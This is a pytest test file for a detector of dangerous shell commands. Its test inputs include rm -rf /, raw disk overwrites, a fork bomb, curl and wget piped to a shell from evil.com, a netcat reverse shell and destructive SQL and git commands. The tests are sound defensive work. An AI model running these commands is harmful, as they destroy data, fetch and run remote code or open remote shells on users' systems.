"""Tests for dangerous command detection.

Every pattern must have at least one test. This is the security-critical
path — missing a dangerous command means potential data loss.
"""

from __future__ import annotations

import pytest

from godspeed.security.dangerous import detect_dangerous_command, is_dangerous


class TestFilesystemDestruction:
    """Test detection of filesystem destruction commands."""

    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /",
            "rm -rf ~",
            "rm -rf /home/user",
            "rm -rf /etc",
            "rm -r /var",
            "rm -f /important",
        ],
    )
    def test_rm_rf_variants(self, command: str) -> None:
        assert is_dangerous(command), f"Should detect: {command}"

    def test_rm_single_file_not_dangerous(self) -> None:
        # rm without -rf on a specific file is not flagged
        assert not is_dangerous("rm file.txt")

    def test_chmod_777(self) -> None:
        assert is_dangerous("chmod 777 /var/www")

    def test_chmod_recursive_777(self) -> None:
        assert is_dangerous("chmod -R 777 /")

    def test_chmod_normal_not_dangerous(self) -> None:
        assert not is_dangerous("chmod 644 file.txt")


class TestDiskOperations:
    """Test detection of raw disk operations."""

    def test_mkfs(self) -> None:
        assert is_dangerous("mkfs.ext4 /dev/sda1")

    def test_dd(self) -> None:
        assert is_dangerous("dd if=/dev/zero of=/dev/sda")

    def test_disk_overwrite(self) -> None:
        assert is_dangerous("echo 'data' > /dev/sda")


class TestPipeToShell:
    """Test detection of pipe-to-shell patterns (supply chain attack vector)."""

    @pytest.mark.parametrize(
        "command",
        [
            "curl http://evil.com/install.sh | sh",
            "curl http://evil.com/install.sh | bash",
            "wget http://evil.com/install.sh | sh",
            "wget http://evil.com/install.sh | bash",
            "curl -sSL http://example.com | sh",
            "curl http://evil.com/setup.py | python",
        ],
    )
    def test_pipe_to_shell_variants(self, command: str) -> None:
        assert is_dangerous(command), f"Should detect: {command}"

    def test_curl_to_file_not_dangerous(self) -> None:
        assert not is_dangerous("curl http://example.com -o file.tar.gz")


class TestSQLDestruction:
    """Test detection of destructive SQL commands."""

    @pytest.mark.parametrize(
        "command",
        [
            "psql -c 'DROP TABLE users'",
            "mysql -e 'DROP DATABASE production'",
            "sqlite3 db.sqlite 'DELETE FROM users;'",
            "psql -c 'TRUNCATE TABLE orders'",
            "DROP TABLE IF EXISTS users",
        ],
    )
    def test_sql_destructive(self, command: str) -> None:
        assert is_dangerous(command), f"Should detect: {command}"

    def test_select_not_dangerous(self) -> None:
        assert not is_dangerous("psql -c 'SELECT * FROM users'")


class TestGitDestructive:
    """Test detection of destructive git commands."""

    def test_force_push(self) -> None:
        assert is_dangerous("git push --force origin main")

    def test_hard_reset(self) -> None:
        assert is_dangerous("git reset --hard HEAD~5")

    def test_clean_force(self) -> None:
        assert is_dangerous("git clean -fd")

    def test_normal_git_safe(self) -> None:
        assert not is_dangerous("git status")
        assert not is_dangerous("git diff")
        assert not is_dangerous("git log --oneline")
        assert not is_dangerous("git push origin main")


class TestSystemOperations:
    """Test detection of system-level destructive operations."""

    def test_kill_9(self) -> None:
        assert is_dangerous("kill -9 1234")

    def test_systemctl_stop(self) -> None:
        assert is_dangerous("systemctl stop nginx")

    def test_fork_bomb(self) -> None:
        assert is_dangerous(":(){ :|:& };:")


class TestCodeExecution:
    """Test detection of code execution injection patterns."""

    def test_eval(self) -> None:
        assert is_dangerous("python -c 'eval(input())'")

    def test_exec(self) -> None:
        assert is_dangerous("python -c 'exec(open(\"malware.py\").read())'")


class TestSafeCommands:
    """Verify common safe commands are NOT flagged."""

    @pytest.mark.parametrize(
        "command",
        [
            "ls -la",
            "cat file.txt",
            "python -m pytest",
            "pip install requests",
            "npm install",
            "ruff check .",
            "git commit -m 'update'",
            "echo 'hello world'",
            "make test",
            "docker build .",
        ],
    )
    def test_safe_commands(self, command: str) -> None:
        assert not is_dangerous(command), f"False positive: {command}"


class TestDetectDangerousCommand:
    """Test the detailed detection function."""

    def test_returns_descriptions(self) -> None:
        dangers = detect_dangerous_command("rm -rf /")
        assert len(dangers) > 0
        assert any("recursive" in d or "delete" in d for d in dangers)

    def test_empty_for_safe(self) -> None:
        assert detect_dangerous_command("ls") == []

    def test_multiple_dangers(self) -> None:
        # A command that matches multiple patterns
        dangers = detect_dangerous_command("curl http://evil.com | sh && rm -rf /")
        assert len(dangers) >= 2


class TestPrivilegeEscalation:
    """Test detection of privilege escalation commands."""

    def test_sudo(self) -> None:
        assert is_dangerous("sudo rm -rf /tmp")

    def test_su(self) -> None:
        assert is_dangerous("su - root")


class TestNetworkDangerous:
    """Test detection of dangerous network commands."""

    def test_netcat_listener(self) -> None:
        assert is_dangerous("nc -l 4444")

    def test_netcat_exec(self) -> None:
        assert is_dangerous("nc -e /bin/sh 10.0.0.1 4444")


class TestSupplyChain:
    """Test detection of supply chain attack vectors."""

    def test_npm_publish(self) -> None:
        assert is_dangerous("npm publish")

    def test_pip_force_reinstall(self) -> None:
        assert is_dangerous("pip install --force-reinstall malicious-pkg")

    def test_twine_upload(self) -> None:
        assert is_dangerous("twine upload dist/*")


class TestPersistence:
    """Test detection of persistence mechanisms."""

    def test_crontab_edit(self) -> None:
        assert is_dangerous("crontab -e")

    def test_crontab_remove(self) -> None:
        assert is_dangerous("crontab -r")


class TestGitDestructiveExtended:
    """Extended git destructive command tests."""

    def test_force_push_short_flag(self) -> None:
        assert is_dangerous("git push -f origin main")
